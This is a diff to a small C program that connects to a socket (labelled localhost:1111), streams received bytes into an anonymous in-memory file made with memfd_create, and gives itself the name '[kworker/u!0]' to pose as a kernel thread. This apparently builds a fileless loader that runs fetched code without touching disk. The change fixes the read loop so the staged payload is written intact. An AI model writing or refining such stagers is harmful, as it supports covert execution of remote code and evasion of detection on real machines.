@@ -30,6 +30,7 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 // Got index from http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
 #define __NR_memfd_create 319
 #define MFD_CLOEXEC 1
+#define BUF_SIZE 1024
 
 static inline int memfd_create(const char *name, unsigned int flags) {
     return syscall(__NR_memfd_create, name, flags);
@@ -40,8 +41,8 @@ extern char        **environ;
 int
 main (int argc, char **argv)
 {
-  int                fd, s;
-  unsigned long      addr = 0x0100007f11110002;
+  int                fd, s, n;
+  unsigned long      addr = 0x0100007f11110002; // localhost:1111
   char               *args[2]= {"[kworker/u!0]", NULL};
   char               buf[1024];
 
@@ -52,8 +53,9 @@ main (int argc, char **argv)
 
   while (1)
     {
-      if ((read (s, buf, 1024) ) <= 0) break;
-      write (fd, buf, 1024);
+      if ((n = read (s, buf, BUF_SIZE) ) <= 0) break;
+      write (fd, buf, n);
+      if (n < BUF_SIZE) break;
     }
   close (s);
   
